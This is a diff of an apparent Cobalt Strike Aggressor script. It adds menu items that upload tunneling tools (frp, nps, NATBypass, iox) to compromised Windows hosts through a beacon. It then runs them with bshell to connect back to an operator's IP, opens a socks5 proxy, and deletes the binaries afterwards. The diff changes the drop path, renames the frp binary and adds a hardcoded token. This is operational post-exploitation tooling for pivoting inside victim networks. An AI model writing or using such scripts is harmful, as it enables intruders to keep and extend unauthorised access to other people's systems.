@@ -1,8 +1,8 @@
 menu "内网穿透" {
-	menu "frpModify(无需frpc.ini落地)" {
+	menu "frpModify" {
 		item "上传frpc" {
 			$bid = $1;
-			$dialog = dialog("上传frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &frp_upload);
+			$dialog = dialog("上传frpc", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &frp_upload);
 			dialog_description($dialog,"frp指定参数版（无需frpc.ini落地）。项目地址：https://github.com/uknowsec/frpModify");
 			drow_text($dialog, "UploadPath",  "上传路径: ");
 			dbutton_action($dialog, "上传");
@@ -11,15 +11,15 @@ menu "内网穿透" {
 		sub frp_upload {
 			bcd($bid, $3['UploadPath']);
 			if (-is64 $bid['id']) {
-				bupload($bid, script_resource("/scripts/Intranet agent/x64/frpmodify.exe"));
+				bupload($bid, script_resource("/scripts/Intranet agent/x64/frpcx.exe"));
 			}else{
-				bupload($bid, script_resource("/scripts/Intranet agent/x86/frpmodify.exe"));
+				bupload($bid, script_resource("/scripts/Intranet agent/x86/frpcx.exe"));
 			}
 		}
 		item "运行frpc"{
 			$bid = $1['@'];
 			$Dialog = dialog("运行frpc",%(ip => "x.x.x.x", port => "2333",bid => $bid),&frpc_run);
-			dialog_description($Dialog, "运行frpc，使用了frpModify，指定参数即可，socks5端口为23333。");
+			dialog_description($Dialog, "运行frpc，使用了frpModify，指定参数即可，token为：uknowsec，socks5端口为23333。");
 			drow_text($Dialog, "ip", "ip: ");
 			drow_text($Dialog, "port", "port: ");
 			dbutton_action($Dialog, "运行");
@@ -29,26 +29,26 @@ menu "内网穿透" {
 			local('$Name $port');
 			$Name = $3['ip'];
 			$port = replace($3['port'], "\"", "");
-			bshell($bid, "frpmodify.exe -t  $+ $Name -p  $+ $port");
+			bshell($bid, "frpcx.exe -t  $+ $Name -p  $+ $port");
 		}
 		item "停止frpc"{
 			local('$bid');
 			foreach $bid ($1){
-				bshell($1, "taskkill -f /im frpmodift.exe");
+				bshell($1, "taskkill -f /im frpcx.exe");
 			}
 		}
 		item "删除frpc"{
 			local('$bid');
 			foreach $bid ($1){
-				bshell($1, "taskkill -f /im frpmodift.exe & del /f /s /q frpmodify.exe");
+				bshell($1, "taskkill -f /im frpcx.exe & del /f /s /q frpcx.exe");
 			}
 		}
 	}
 
-	menu "nps(无配置文件落地)" {
+	menu "nps" {
 		item "上传npc" {
 			$bid = $1;
-			$dialog = dialog("上传npc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &npc_upload);
+			$dialog = dialog("上传npc", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &npc_upload);
 			dialog_description($dialog,"一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发。使用参考：https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。项目地址：https://github.com/ehang-io/nps");
 			drow_text($dialog, "UploadPath",  "上传路径: ");
 			dbutton_action($dialog, "上传");
@@ -91,7 +91,7 @@ menu "内网穿透" {
 	menu "NATBypass(端口转发)" {
 		item "上传nb" {
 			$bid = $1;
-			$dialog = dialog("上传nb", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &nb);
+			$dialog = dialog("上传nb", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &nb);
 			dialog_description($dialog,"一款lcx在golang下的实现。项目地址：https://github.com/cw1997/NATBypass");
 			drow_text($dialog, "UploadPath",  "上传路径: ");
 			dbutton_action($dialog, "上传");
@@ -137,7 +137,7 @@ menu "内网穿透" {
 	menu "iox(端口转发与socks5)" {
 		item "上传iox" {
 			$bid = $1;
-			$dialog = dialog("上传iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
+			$dialog = dialog("上传iox", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &iox);
 			dialog_description($dialog,"端口转发工具和socks5代理。项目地址：https://github.com/EddieIvan01/iox");
 			drow_text($dialog, "UploadPath",  "上传路径: ");
 			dbutton_action($dialog, "上传");
